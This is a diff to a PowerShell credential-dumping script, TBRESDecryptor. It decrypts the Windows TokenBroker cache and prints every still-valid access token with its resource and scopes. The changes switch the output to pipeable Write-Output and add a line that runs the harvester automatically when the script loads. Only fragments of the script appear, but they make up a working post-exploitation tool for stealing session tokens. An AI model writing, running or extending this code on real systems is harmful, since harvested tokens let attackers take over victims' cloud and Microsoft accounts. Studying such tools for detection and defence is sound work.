@@ -27,18 +27,18 @@ function DecodeJwtPayload {
 
 function Check-Token($AccessToken) {
     $jwtPayload = DecodeJwtPayload -Jwt $AccessToken
-    
+
     $exp = ([DateTimeOffset]::FromUnixTimeSeconds($jwtPayload.exp)).LocalDateTime
     if ($exp -lt (Get-Date)) {
         return
     }
 
-    Write-Host ("-" * 100)
-    Write-Host "Valid token $exp"
-    Write-Host "Resource: $($jwtPayload.aud)"
-    Write-Host "Scope/Roles: $($jwtPayload.scp)"
-    Write-Host "Token: $($AccessToken)"
-    Write-Host ("-" * 100)
+    Write-Output ("-" * 100)
+    Write-Output "Valid token $exp"
+    Write-Output "Resource: $($jwtPayload.aud)"
+    Write-Output "Scope/Roles: $($jwtPayload.scp)"
+    Write-Output "Token: $($AccessToken)"
+    Write-Output ("-" * 100)
 }
 
 function Get-Tokens($decryptedString) {
@@ -84,7 +84,7 @@ function Output-DecryptedData($origFile, $jsonString) {
 }
 
 function Invoke-TBRESDecryptor {
-    Write-Host "`n          --++[[ TBRESDecryptor ]]++--`n"
+    Write-Output "`n          --++[[ TBRESDecryptor ]]++--`n"
     
     $path = Join-Path $env:LOCALAPPDATA "Microsoft\TokenBroker\Cache"
     
@@ -110,3 +110,5 @@ function Invoke-TBRESDecryptor {
         }
     }
 }
+
+Invoke-TBRESDecryptor
